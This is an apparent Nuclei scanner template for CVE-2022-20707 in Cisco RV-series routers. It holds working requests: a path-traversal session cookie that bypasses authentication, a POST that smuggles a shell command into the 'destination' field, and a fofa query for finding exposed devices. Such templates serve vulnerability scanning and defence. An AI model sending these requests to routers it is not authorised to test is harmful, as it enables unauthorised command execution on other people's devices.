id: CVE-2022-20707

info:
  name: Cisco RV Series Command Injection and Authentication Bypass
  author: ProjectDiscoveryAI
  severity: critical
  description: Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an attacker to execute arbitrary commands, bypass authentication, and potentially elevate privileges.
  impact: |
    Successful exploitation could result in unauthorized access and execution of arbitrary commands.
  remediation: |
    Apply the necessary patches provided by Cisco to mitigate the vulnerabilities.
  reference:
    - http://packetstormsecurity.com/files/170988/Cisco-RV-Series-Authentication-Bypass-Command-Injection.html
    - https://www.zerodayinitiative.com/advisories/ZDI-22-409/
    - https://www.zerodayinitiative.com/advisories/ZDI-22-411/
    - https://www.zerodayinitiative.com/advisories/ZDI-22-419/
    - https://github.com/20142995/Goby
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2022-20707
    cwe-id: CWE-121,CWE-787
    epss-score: 0.08779
    epss-percentile: 0.9478
    cpe: cpe:2.3:o:cisco:rv340_firmware:*:*:*:*:*:*:*:*
  metadata:
    vendor: cisco
    product: rv340_firmware
    fofa-query: app="CISCO-RV340" || app="CISCO-RV340W" || app="CISCO-RV345" || app="CISCO-RV345P"
  tags: intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/upload"

    headers:
      Cookie: "sessionid=../../www/index.html; sessionid={{rand_text_alpha(16)}}"
    matchers:
      - type: status
        status:
          - 405

  - method: POST
    path:
      - "{{BaseURL}}/upload"

    headers:
      Cookie: "sessionid=../../www/index.html; sessionid={{rand_text_alpha(16)}}"

    body: |
      file.path=/tmp/upload.input&filename={{rand_text_alpha(10)}}&pathparam=Configuration&fileparam={{rand_text_alpha(10)}}&destination=';{{base64('id')}}#&input={{rand_text_alpha(10)}}
    matchers:
      - type: status
        status:
          - 200
